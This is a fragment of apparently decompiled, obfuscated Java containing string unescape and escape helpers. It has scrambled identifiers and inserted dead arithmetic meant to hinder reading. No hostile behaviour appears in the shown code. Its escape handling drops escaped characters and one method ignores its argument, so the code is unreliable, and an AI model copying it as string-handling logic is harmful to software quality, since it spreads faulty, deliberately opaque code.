         for (int optsData = configMax; optsData < C4Oeik.length(); optsData++) {
            char gzlA_RuHc_Ydue_KmWx = C4Oeik.charAt(optsData);
            if (Qvg) {
               switch (gzlA_RuHc_Ydue_KmWx) {
                  case '"':
                     break;
                  case '\\':
                     break;
                  case 'n':
                     break;
                  case 'r':
                     break;
                  case 't':
                     break;
                  default:
                     retMax.append(gzlA_RuHc_Ydue_KmWx);
               }

               Qvg = false;
            } else if (gzlA_RuHc_Ydue_KmWx == '\\') {
               Qvg = true;
            } else {
               if (gzlA_RuHc_Ydue_KmWx == '"') {
                  break;
               }

               retMax.append(gzlA_RuHc_Ydue_KmWx);
            }
         }

         String OKEQ_mTnf_lkNu_SnaF = retMax.toString();
         return OKEQ_mTnf_lkNu_SnaF.equals("null") ? null : OKEQ_mTnf_lkNu_SnaF;
      }
   }

   private String ibllxUhmlBdnu(String s) {
      if (lfxv_ypgpn_ip == null) {
         return "";
      } else {
         StringBuilder qgpy_wcxs_BAAn_auWF = new StringBuilder();

         for (char xRfK_UGWD_ZTuC_soaL : lfxv_ypgpn_ip.toCharArray()) {
            switch (xRfK_UGWD_ZTuC_soaL) {
               case '\t':
                  break;
               case '\n':
                  int var10 = -930640972;
                  if (var10 == -930640972) {
                     var10 = 2081366368;
                     var10 ^= -171173044;
                     long var11 = -3038059295951654496L;
                     var11 &= -1514603221793834816L;
                     var11 |= -1538830168491642889L;
                  }

                  break;
               case '\r':
                  break;
               case '"':
                  break;
               case '\\':
                  break;
               default:
                  if (xRfK_UGWD_ZTuC_soaL < ' ') {
                     qgpy_wcxs_BAAn_auWF.append(String.format("\\u%04x", Integer.valueOf(xRfK_UGWD_ZTuC_soaL)));
                  } else {
                     qgpy_wcxs_BAAn_auWF.append(xRfK_UGWD_ZTuC_soaL);
                  }
            }
         }

         return qgpy_wcxs_BAAn_auWF.toString();
      }
   }
}
